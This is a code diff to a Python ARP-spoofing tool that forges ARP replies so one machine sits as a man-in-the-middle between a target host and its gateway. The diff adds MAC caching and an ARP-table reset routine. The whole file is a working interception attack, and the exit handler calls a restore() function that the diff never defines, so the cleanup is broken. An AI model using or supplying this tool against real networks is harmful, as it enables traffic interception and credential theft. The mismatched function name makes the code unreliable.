@@ -20,8 +20,7 @@ def get_MAC(ip):
     return response_list[0][1].hwsrc
 
 #Use ARP response to update MAC address of spoof_ip on victim_IP ARP table 
-def spoof(victim_IP, spoof_IP):
-    victim_MAC = get_MAC(victim_IP)
+def spoof(victim_IP, victim_MAC, spoof_IP):
     packet = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=spoof_IP)
     send(packet, verbose=False)
 
@@ -39,6 +38,12 @@ def check_format_IP(IP_address):
 
     return IP_address
 
+
+def reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC):
+    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
+    send(packet, count=4, verbose=False)
+    packet = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP, hwsrc=target_MAC)
+    send(packet, count=4, verbose=False)
 
 #Parser of command line arguments
 def args_parser():
@@ -77,23 +82,25 @@ def main():
     #To establish MIDM connection, we need to repeat the update of ARP 
     #table for victim and gateway otherwise it is automatic reset
     target_IP, gateway_IP = args_parser()
+    target_MAC = get_MAC(target_IP)
+    gateway_MAC = get_MAC(gateway_IP)
     num_pkts = 0
 
     try:
         while True:
             #Send ARP response to target_IP so my PC pretends to be the gateway
             #sending my MAC as Ethernet Address of packet 
-            spoof(target_IP, gateway_IP)
+            spoof(target_IP, target_MAC, gateway_IP)
             #Send ARP response to gateway_IP so my PC pretends to be the target
             #sending my MAC as Ethernet Address of packet
-            spoof(gateway_IP, target_IP)
+            spoof(gateway_IP, gateway_MAC, target_IP)
             num_pkts += 2
             print('\rPackets sent: ', end='')
             cprint('{:>5}'.format(num_pkts), 'blue', attrs=['bold',], end='')
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n\n[Detected CTRL+C] Closing the program...", end='\n\n')
-        exit(0)
+        restore(target_IP, target_MAC, gateway_IP, gateway_MAC)
 
 if __name__=="__main__":
     main()
